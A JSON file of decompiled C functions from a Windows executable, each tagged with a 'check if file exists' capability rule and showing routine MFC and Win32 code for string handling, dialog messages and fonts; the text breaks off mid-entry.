{
    "004010b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.004010b0(uint32_t *param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = param_2 * param_3;\n    if ((param_2 * param_3 >> 0x20) + (0x7fffffff < uVar1) != 0) {\n        return 0x80070057;\n    }\n    *param_1 = uVar1;\n    return 0;\n}\n",
        "token_count": 113
    },
    "00401560": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Removing unreachable block (ram,0x004016b3)\n\nvoid __cdecl fcn.00401560(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    ulong uVar4;\n    uchar *var_2ch;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x48f098;\n    var_ch = *in_FS_OFFSET;\n    var_2ch = *0x4b8030 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    (**0x4b94e8)(var_2ch);\n    var_4h = 0;\n    var_1ch = 0;\n    if (arg_10h != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrlenW)(arg_10h);\n        var_1ch = 0;\n        var_2ch = &stack0xffffffd4;\n        uVar4 = fcn.00464420();\n        uVar2 = uVar4;\n        if ((uVar4 >> 0x20) + (0x7fffffff < uVar2) == 0) {\n            if ((uVar2 < 0x401) && (cVar1 = fcn.00401120(uVar2),  cVar1 != '\\0')) {\n                fcn.00462d70();\n            }\n            else {\n                var_2ch = fcn.00402070();\n            }\n            var_1ch = fcn.00401240();\n            if (var_1ch != 0) goto code_r0x00401618;\n        }\n        var_2ch = 0x8007000e;\n        fcn.00401280(0x8007000e);\n    }\ncode_r0x00401618:\n    iVar3 = 0;\n    if (arg_18h != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrlenW)(arg_18h, var_2ch);\n        var_1ch = 0;\n        var_2ch = &stack0xffffffd4;\n        uVar4 = fcn.00464420();\n        uVar2 = uVar4;\n        if ((uVar4 >> 0x20) + (0x7fffffff < uVar2) == 0) {\n            if ((uVar2 < 0x401) && (cVar1 = fcn.00401120(uVar2),  cVar1 != '\\0')) {\n                fcn.00462d70();\n            }\n            else {\n                var_2ch = fcn.00402070();\n            }\n            iVar3 = fcn.00401240();\n            if (iVar3 != 0) goto code_r0x00401692;\n        }\n        var_2ch = 0x8007000e;\n        iVar3 = fcn.00401280(0x8007000e);\n    }\ncode_r0x00401692:\n    (*_sym.imp.KERNEL32.dll_CompareStringA)(arg_8h, arg_ch, var_1ch, arg_14h, iVar3, arg_1ch, var_2ch);\n    *in_FS_OFFSET = var_ch;\n    fcn.0045e747(var_1ch);\n    return;\n}\n",
        "token_count": 850
    },
    "004018c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004018c0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t *in_FS_OFFSET;\n    ulong uVar6;\n    uint32_t var_38h;\n    uint in_stack_ffffffd4;\n    uint var_24h;\n    uint32_t var_1ch;\n    uint var_18h;\n    uint *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x48f028;\n    var_ch = *in_FS_OFFSET;\n    var_38h = *0x4b8030 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.004018c0::var_ch;\n    uVar2 = (**0x4b94e8)();\n    var_14h = NULL;\n    var_4h = 0;\n    var_18h = uVar2;\n    if (arg_ch == 0) {\n        var_1ch = 0;\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_lstrlenW)(arg_ch);\n        in_stack_ffffffd4 = 0;\n        puVar3 = &fcn.004018c0::var_38h;\n        var_38h = 0x40191d;\n        uVar6 = fcn.00464420();\n        uVar5 = uVar6;\n        if ((uVar6 >> 0x20) + (0x7fffffff < uVar5) == 0) {\n            if ((uVar5 < 0x401) && (var_38h = uVar5,  cVar1 = fcn.00401120(),  cVar1 != '\\0')) {\n                var_38h = 0x40194c;\n                fcn.00462d70();\n            }\n            else {\n                var_38h = uVar5;\n                puVar3 = fcn.00402070();\n            }\n            if (puVar3 != NULL) {\n                *puVar3 = 0;\n                iVar4 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(uVar2, 0, arg_ch, 0xffffffff, puVar3, uVar5, 0, 0);\n                var_1ch = -(iVar4 != 0) & puVar3;\n                goto code_r0x00401986;\n            }\n        }\n        var_1ch = 0;\n    }\ncode_r0x00401986:\n    if (arg_8h != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrlenW)(arg_8h);\n        in_stack_ffffffd4 = 0;\n        puVar3 = &fcn.004018c0::var_38h;\n        var_38h = 0x4019a2;\n        uVar6 = fcn.00464420();\n        uVar5 = uVar6;\n        if ((uVar6 >> 0x20) + (0x7fffffff < uVar5) == 0) {\n            if ((uVar5 < 0x401) && (var_38h = uVar5,  cVar1 = fcn.00401120(),  cVar1 != '\\0')) {\n                var_38h = 0x4019d1;\n                fcn.00462d70();\n            }\n            else {\n                var_38h = uVar5;\n                puVar3 = fcn.00402070();\n            }\n            if (puVar3 != NULL) {\n                *puVar3 = 0;\n                iVar4 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                  (var_18h, 0, arg_8h, 0xffffffff, puVar3, uVar5, 0, 0);\n                uVar5 = -(iVar4 != 0) & puVar3;\n                goto code_r0x00401a06;\n            }\n        }\n    }\n    uVar5 = 0;\ncode_r0x00401a06:\n    (*_sym.imp.KERNEL32.dll_lstrcmpiA)(uVar5, var_1ch);\n    while (var_14h != NULL) {\n        puVar3 = *var_14h;\n        fcn.0045e756(var_14h);\n        var_14h = puVar3;\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0045e747(in_stack_ffffffd4);\n    return;\n}\n",
        "token_count": 1042
    },
    "00401ab0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401c1a)\n// WARNING: Removing unreachable block (ram,0x00401c20)\n\nvoid __cdecl fcn.00401ab0(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uchar *puVar5;\n    int16_t *piVar6;\n    uchar *puVar7;\n    int32_t *in_FS_OFFSET;\n    ulong uVar8;\n    int16_t *piStack60;\n    uchar *puStack56;\n    int16_t *var_30h;\n    int32_t in_stack_ffffffdc;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x48f1a8;\n    var_ch = *in_FS_OFFSET;\n    var_30h = *0x4b8030 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.00401ab0::var_ch;\n    puVar7 = NULL;\n    if (arg_8h == NULL) {\n        puStack56 = 0x80004005;\n        piStack60 = 0x401af5;\n        fcn.00401280();\n    }\n    piStack60 = 0x401afb;\n    (**0x4b94e8)();\n    var_4h = 0;\n    if (arg_8h != NULL) {\n        piStack60 = arg_8h;\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n        puStack56 = iVar3 + 1;\n        puVar7 = &stack0xffffffc8;\n        uVar8 = fcn.00464420();\n        if ((uVar8 >> 0x20) + (0x7fffffff < uVar8) == 0) {\n            if ((uVar8 < 0x401) && (cVar2 = fcn.00401120(),  cVar2 != '\\0')) {\n                fcn.00462d70();\n            }\n            else {\n                puVar7 = fcn.00402070();\n            }\n            var_30h = arg_8h;\n            piStack60 = 0x401b71;\n            puStack56 = puVar7;\n            puVar7 = fcn.00401240();\n        }\n        else {\n            puVar7 = NULL;\n        }\n    }\n    piStack60 = puVar7;\n    (*_sym.imp.USER32.dll_CharLowerA)();\n    if (puVar7 == NULL) {\n        uVar4 = 0;\n    }\n    else {\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar7);\n        piStack60 = iVar3 + 1;\n        in_stack_ffffffdc = piStack60 >> 0x1f;\n        puVar5 = &stack0xffffffc4;\n        uVar8 = fcn.00464420();\n        piVar6 = uVar8;\n        if ((uVar8 >> 0x20) + (0x7fffffff < piVar6) == 0) {\n            if ((piVar6 < 0x401) && (cVar2 = fcn.00401120(),  cVar2 != '\\0')) {\n                fcn.00462d70();\n            }\n            else {\n                puVar5 = fcn.00402070();\n            }\n            piStack60 = puVar5;\n            puStack56 = puVar7;\n            var_30h = piVar6;\n            uVar4 = fcn.00401200();\n        }\n        else {\n            uVar4 = 0;\n        }\n    }\n    piVar6 = arg_8h;\n    do {\n        iVar1 = *piVar6;\n        piVar6 = piVar6 + 1;\n    } while (iVar1 != 0);\n    uVar4 = fcn.0045ef32(arg_8h, (piVar6 - (arg_8h + 1) >> 1) + 1, uVar4);\n    fcn.00401000(uVar4);\n    *in_FS_OFFSET = var_ch;\n    fcn.0045e747(in_stack_ffffffdc);\n    return;\n}\n",
        "token_count": 974
    },
    "00401cb0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401e1a)\n// WARNING: Removing unreachable block (ram,0x00401e20)\n\nvoid __cdecl fcn.00401cb0(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uchar *puVar5;\n    int16_t *piVar6;\n    uchar *puVar7;\n    int32_t *in_FS_OFFSET;\n    ulong uVar8;\n    int16_t *piStack60;\n    uchar *puStack56;\n    int16_t *var_30h;\n    int32_t in_stack_ffffffdc;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x48f178;\n    var_ch = *in_FS_OFFSET;\n    var_30h = *0x4b8030 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.00401cb0::var_ch;\n    puVar7 = NULL;\n    if (arg_8h == NULL) {\n        puStack56 = 0x80004005;\n        piStack60 = 0x401cf5;\n        fcn.00401280();\n    }\n    piStack60 = 0x401cfb;\n    (**0x4b94e8)();\n    var_4h = 0;\n    if (arg_8h != NULL) {\n        piStack60 = arg_8h;\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n        puStack56 = iVar3 + 1;\n        puVar7 = &stack0xffffffc8;\n        uVar8 = fcn.00464420();\n        if ((uVar8 >> 0x20) + (0x7fffffff < uVar8) == 0) {\n            if ((uVar8 < 0x401) && (cVar2 = fcn.00401120(),  cVar2 != '\\0')) {\n                fcn.00462d70();\n            }\n            else {\n                puVar7 = fcn.00402070();\n            }\n            var_30h = arg_8h;\n            piStack60 = 0x401d71;\n            puStack56 = puVar7;\n            puVar7 = fcn.00401240();\n        }\n        else {\n            puVar7 = NULL;\n        }\n    }\n    piStack60 = puVar7;\n    (*_sym.imp.USER32.dll_CharUpperA)();\n    if (puVar7 == NULL) {\n        uVar4 = 0;\n    }\n    else {\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar7);\n        piStack60 = iVar3 + 1;\n        in_stack_ffffffdc = piStack60 >> 0x1f;\n        puVar5 = &stack0xffffffc4;\n        uVar8 = fcn.00464420();\n        piVar6 = uVar8;\n        if ((uVar8 >> 0x20) + (0x7fffffff < piVar6) == 0) {\n            if ((piVar6 < 0x401) && (cVar2 = fcn.00401120(),  cVar2 != '\\0')) {\n                fcn.00462d70();\n            }\n            else {\n                puVar5 = fcn.00402070();\n            }\n            piStack60 = puVar5;\n            puStack56 = puVar7;\n            var_30h = piVar6;\n            uVar4 = fcn.00401200();\n        }\n        else {\n            uVar4 = 0;\n        }\n    }\n    piVar6 = arg_8h;\n    do {\n        iVar1 = *piVar6;\n        piVar6 = piVar6 + 1;\n    } while (iVar1 != 0);\n    uVar4 = fcn.0045ef32(arg_8h, (piVar6 - (arg_8h + 1) >> 1) + 1, uVar4);\n    fcn.00401000(uVar4);\n    *in_FS_OFFSET = var_ch;\n    fcn.0045e747(in_stack_ffffffdc);\n    return;\n}\n",
        "token_count": 973
    },
    "00402100": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402110)\n\nint32_t __thiscall fcn.00402100(int32_t *param_1, uint32_t param_2)\n\n{\n    if (param_2 < 0x81) {\n        *param_1 = param_1 + 1;\n        return param_1 + 1;\n    }\n    fcn.004022c0(param_2);\n    return *param_1;\n}\n",
        "token_count": 101
    },
    "00402340": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00402340(uint32_t param_1, uint32_t param_2)\n\n{\n    if (param_1 * param_2 >> 0x20 != 0) {\n        fcn.00401280(0x80070057);\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "00411703": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00411703(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    code **ppcVar4;\n    int32_t *in_ECX;\n    uint32_t arg_ch_00;\n    int32_t *piVar5;\n    \n    if (arg_ch == 0xfffffffe) {\n        iVar1 = fcn.0043026e();\n        if (*(iVar1 + 0x3c) != 0) goto code_r0x00411721;\n    }\n    else {\n        if (arg_ch != 0xfffffffd) {\n            if (arg_ch != 0xffffffff) {\n                arg_ch_00 = arg_ch >> 0x10;\n                arg_ch = arg_ch & 0xffff;\n                if (arg_ch_00 != 0) goto code_r0x004117d7;\n            }\n            arg_ch_00 = 0x111;\ncode_r0x004117d7:\n            ppcVar4 = (**(*in_ECX + 0x28))();\n            while( true ) {\n                if (*ppcVar4 == NULL) {\n                    return 0;\n                }\n                iVar1 = fcn.0041619b(ppcVar4[1], arg_ch_00, arg_ch, arg_8h);\n                if (iVar1 != 0) break;\n                ppcVar4 = (**ppcVar4)();\n            }\n            iVar1 = fcn.004115cb(in_ECX, arg_8h, arg_ch, *(iVar1 + 0x14), arg_10h, *(iVar1 + 0x10), arg_14h);\n            return iVar1;\n        }\n        arg_ch = 0;\n        if (arg_10h != 0) {\n            iVar1 = *(arg_10h + 0x30);\n            puVar2 = (**(*in_ECX + 0x2c))();\n            do {\n                if (puVar2 == NULL) {\n                    return arg_ch;\n                }\n                if (arg_ch != 0) {\n                    return arg_ch;\n                }\n                piVar5 = puVar2[1];\n                while (((piVar5[1] != 0 && (piVar5[2] != 0)) && (arg_ch == 0))) {\n                    if (arg_8h == piVar5[1]) {\n                        if (iVar1 == 0) {\n                            if (*piVar5 == 0) {\ncode_r0x0041179e:\n                                *(arg_10h + 4) = piVar5[2];\n                                arg_ch = 1;\n                            }\n                        }\n                        else if ((*piVar5 != 0) && (iVar3 = fcn.004115b3(iVar1, *piVar5),  iVar3 != 0))\n                        goto code_r0x0041179e;\n                    }\n                    piVar5 = piVar5 + 3;\n                }\n                puVar2 = *puVar2;\n            } while( true );\n        }\n    }\n    fcn.00411e42();\ncode_r0x00411721:\n    iVar1 = fcn.0043026e();\n    iVar1 = (**(**(iVar1 + 0x3c) + 4))();\n    return iVar1;\n}\n",
        "token_count": 746
    },
    "null": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl method.CDialog.virtual_12(uint32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.00411703(arg_8h, arg_ch, arg_10h, arg_14h);\n    if (iVar1 == 0) {\n        if ((((arg_ch == 0) || (arg_ch == -1)) && (arg_8h < 0)) && (arg_8h < 0xf000)) {\n            uVar2 = (*_sym.imp.USER32.dll_GetParent)(*(in_ECX + 0x20));\n            piVar3 = fcn.004185c5(uVar2);\n            if (piVar3 != NULL) {\n                iVar1 = (**(*piVar3 + 0xc))(arg_8h, arg_ch, arg_10h, arg_14h);\n                if (iVar1 != 0) goto code_r0x004123c5;\n            }\n            piVar3 = fcn.00426925();\n            if (piVar3 != NULL) {\n                iVar1 = (**(*piVar3 + 0xc))(arg_8h, arg_ch, arg_10h, arg_14h);\n                if (iVar1 != 0) goto code_r0x004123c5;\n            }\n        }\n        uVar2 = 0;\n    }\n    else {\ncode_r0x004123c5:\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 366
    },
    "004130d7": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.004130d7(uint *param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    if (param_2 * param_3 >> 0x20 != 0) {\n        return 0x80070057;\n    }\n    *param_1 = param_2 * param_3;\n    return 0;\n}\n",
        "token_count": 81
    },
    "004131d9": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004131d9(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    if (arg_14h == -1) {\n        arg_14h = fcn.00462a96(arg_10h);\n        arg_14h = arg_14h + 1;\n    }\n    fcn.0041316d(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 112
    },
    "00414de4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00414de4(int32_t *param_1, int32_t param_2)\n\n{\n    if ((param_2 == -1) && (param_2 = *param_1,  param_2 != 0)) {\n        param_2 = fcn.00462ab0(param_2);\n    }\n    fcn.0040f8d0(param_2);\n    return;\n}\n",
        "token_count": 94
    },
    "004152d4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004152d4(int32_t *hWnd, uint arg_ch, uint *lParam)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    piVar2 = hWnd;\n    fcn.004146d0(arg_ch);\n    fcn.0041bcf0(arg_ch, &hWnd);\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    if (*piVar2 == 0) {\n        (*_sym.imp.USER32.dll_SendMessageA)(hWnd, 0x18c, 0xffffffff, *lParam);\n    }\n    else {\n        iVar3 = (*_sym.imp.USER32.dll_SendMessageA)(hWnd, 0x188, 0, 0);\n        if (iVar3 == -1) {\n            fcn.0041372f();\n        }\n        else {\n            uVar4 = (*pcVar1)(hWnd, 0x18a, iVar3, 0);\n            uVar4 = fcn.00415261(uVar4);\n            (*pcVar1)(hWnd, 0x189, iVar3, uVar4);\n        }\n        fcn.00414de4(0xffffffff);\n    }\n    return;\n}\n",
        "token_count": 286
    },
    "004153c8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004153c8(int32_t *hWnd, uint arg_ch, uint *lParam)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    piVar1 = hWnd;\n    fcn.004146d0(arg_ch);\n    fcn.0041bcf0(arg_ch, &hWnd);\n    puVar2 = lParam;\n    if (*piVar1 == 0) {\n        iVar3 = (*_sym.imp.USER32.dll_SendMessageA)(hWnd, 0x14d, 0xffffffff, *lParam);\n        if (iVar3 == -1) {\n            fcn.0043042c(hWnd, *puVar2);\n        }\n    }\n    else {\n        iVar3 = (*_sym.imp.USER32.dll_GetWindowTextLengthA)(hWnd);\n        if (iVar3 < 1) {\n            uVar4 = fcn.0040f8a0(0xff);\n            iVar3 = 0x100;\n        }\n        else {\n            uVar4 = fcn.00415261(iVar3, iVar3 + 1);\n        }\n        (*_sym.imp.USER32.dll_GetWindowTextA)(hWnd, uVar4, iVar3);\n        fcn.00414de4(0xffffffff);\n    }\n    return;\n}\n",
        "token_count": 298
    },
    "0041670c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041670c(int32_t hdc, uint arg_ch, int32_t arg_10h, int32_t hgdiobj, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint lpvObject;\n    uint crColor;\n    \n    if ((((hdc == 0) || (hgdiobj == 0)) || (arg_10h == 1)) || ((arg_10h == 0 || (arg_10h == 5)))) {\ncode_r0x0041677b:\n        uVar2 = 0;\n    }\n    else {\n        if (arg_10h == 2) {\n            iVar1 = fcn.00430603(arg_ch, 2);\n            if (iVar1 == 0) goto code_r0x0041677b;\n        }\n        (*_sym.imp.GDI32.dll_GetObjectA)(hgdiobj, 0xc, &lpvObject);\n        (*_sym.imp.GDI32.dll_SetBkColor)(hdc, crColor);\n        if (arg_18h == -1) {\n            arg_18h = (*_sym.imp.USER32.dll_GetSysColor)(8);\n        }\n        (*_sym.imp.GDI32.dll_SetTextColor)(hdc, arg_18h);\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 304
    },
    "0041b797": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041b797(uint16_t *arg_8h)\n\n{\n    code *pcVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    uint16_t *puVar5;\n    uint *puVar6;\n    uint var_34h;\n    uint var_30h;\n    uint16_t *var_2ch;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_SendDlgItemMessageA;\n    var_4h = 1;\n    puVar5 = arg_8h;\n    var_8h = in_ECX;\n    if (arg_8h != NULL) {\n        do {\n            uVar3 = *puVar5;\n            if (*puVar5 == 0) break;\n            uVar2 = puVar5[1];\n            var_10h = *(puVar5 + 2);\n            puVar5 = puVar5 + 4;\n            var_ch = uVar3;\n            if (uVar2 == 0x1234) {\ncode_r0x0041b802:\n                puVar6 = &var_30h;\n                for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar6 = 0;\n                    puVar6 = puVar6 + 1;\n                }\n                var_30h = 0xffffffff;\n                var_34h = 1;\n                fcn.00413f9d(puVar5);\n                var_2ch = arg_8h;\n                iVar4 = (*pcVar1)(*(var_8h + 0x20), var_ch & 0xffff, 0x401, 0, &var_34h);\n                if (iVar4 == -1) {\n                    var_4h = 0;\n                }\n                fcn.00402740();\n                in_ECX = var_8h;\n            }\n            else if (uVar2 == 0x401) {\n                uVar2 = 0x180;\ncode_r0x0041b863:\n                iVar4 = (*pcVar1)(*(in_ECX + 0x20), uVar3, uVar2, 0, puVar5);\n                if (iVar4 == -1) {\n                    var_4h = 0;\n                }\n            }\n            else {\n                if (uVar2 == 0x403) {\n                    uVar2 = 0x143;\n                }\n                if (uVar2 == 0x401) goto code_r0x0041b802;\n                if ((uVar2 == 0x180) || (uVar2 == 0x143)) goto code_r0x0041b863;\n            }\n            puVar5 = puVar5 + var_10h;\n        } while (var_4h != 0);\n        if (var_4h == 0) {\n            return 0;\n        }\n    }\n    fcn.004191c1(*(in_ECX + 0x20), 0x364, 0, 0, 0, 0);\n    return var_4h;\n}\n",
        "token_count": 735
    },
    "0041d909": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.0041d909(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    \n    if (*0x4b66fc == -1) {\n        uVar2 = (*_sym.imp.USER32.dll_GetDC)(0);\n        uVar3 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x48, 0, 0, 0, 400, 0, 0, 0, 2, 0, 0, 0, 0, \"Marlett\");\n        iVar4 = (*_sym.imp.GDI32.dll_CreateFontA)(uVar3);\n        pcVar1 = _sym.imp.GDI32.dll_SelectObject;\n        if (iVar4 != 0) {\n            (*_sym.imp.GDI32.dll_SelectObject)(uVar2, iVar4);\n        }\n        (*_sym.imp.GDI32.dll_GetCharWidthA)(uVar2, 0x36, 0x36, 0x4b66fc);\n        if (iVar4 != 0) {\n            (*pcVar1)(uVar2, uVar3);\n            (*_sym.imp.GDI32.dll_DeleteObject)(iVar4);\n        }\n        (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar2);\n    }\n    return *0x4b66fc;\n}\n",
        "token_count": 305
    },
    "0041e405": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041e405(uint arg_8h, int32_t *arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_ECX;\n    uint *puVar4;\n    uint *arg_8h_00;\n    uint var_30h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint8_t var_fh;\n    uint var_eh;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    arg_8h_00 = &var_18h;\n    (**(*in_ECX + 0x110))(0x417, arg_8h);\n    *(arg_ch + 2) = *(arg_ch + 2) ^ 4;\n    var_eh._0_1_ = 0;\n    var_eh._1_1_ = 0;\n    *(arg_ch + 10) = 0;\n    *(arg_ch + 0xb) = 0;\n    iVar2 = fcn.00460c0e(arg_ch, &var_18h, 0x14);\n    if (iVar2 != 0) {\n        uVar3 = fcn.0041be35();\n        var_20h = uVar3;\n        fcn.0041be69(0x10000000, 0, 0);\n        (**(*in_ECX + 0x110))(0x416, arg_8h, 0);\n        pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n        if (arg_ch[4] < -1) {\n            var_1ch = (*_sym.imp.USER32.dll_SendMessageA)(in_ECX[8], 0x43d, 0, 0);\n            (*pcVar1)(in_ECX[8], 0xb, 0, 0);\n            (*pcVar1)(in_ECX[8], 0x43c, var_1ch + 1, 0);\n            (*pcVar1)(in_ECX[8], 0x43c, var_1ch, 0);\n            (*pcVar1)(in_ECX[8], 0xb, 1, 0);\n            arg_ch[4] = arg_ch[4] + 1000000;\n            uVar3 = var_20h;\n        }\n        (**(*in_ECX + 0x110))(0x415, arg_8h, arg_ch);\n        fcn.0041be69(0, uVar3 & 0x10000000, 0);\n        if ((((*(arg_ch + 9) ^ var_fh) & 1) == 0) && (((*(arg_ch + 9) & 1) == 0 || (*arg_ch == var_18h)))) {\n            iVar2 = (**(*in_ECX + 0x110))(0x41d, arg_8h, &var_30h);\n            if (iVar2 == 0) goto code_r0x0041e558;\n            puVar4 = &var_30h;\n        }\n        else {\n            puVar4 = NULL;\n        }\n        (*_sym.imp.USER32.dll_InvalidateRect)(in_ECX[8], puVar4, 1);\n    }\ncode_r0x0041e558:\n    fcn.0045e747(arg_8h_00);\n    return;\n}\n",
        "token_count": 790
    },
    "0041edf2": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0041edf2(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    iVar4 = *0x4b66f8;\n    if (*0x4b66f8 == -1) {\n        fcn.0043026e();\n        uVar1 = fcn.004182f8();\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, \"DllGetVersion\");\n        iVar4 = 0x40000;\n        if (pcVar2 != NULL) {\n            fcn.00462290(&var_14h, 0, 0x14);\n            var_14h = 0x14;\n            iVar3 = (*pcVar2)(&var_14h);\n            if (-1 < iVar3) {\n                iVar4 = CONCAT22(var_10h, var_ch);\n            }\n        }\n    }\n    *0x4b66f8 = iVar4;\n    return iVar4;\n}\n",
        "token_count": 262
    },
    "0041efe1": {
        "rules": [
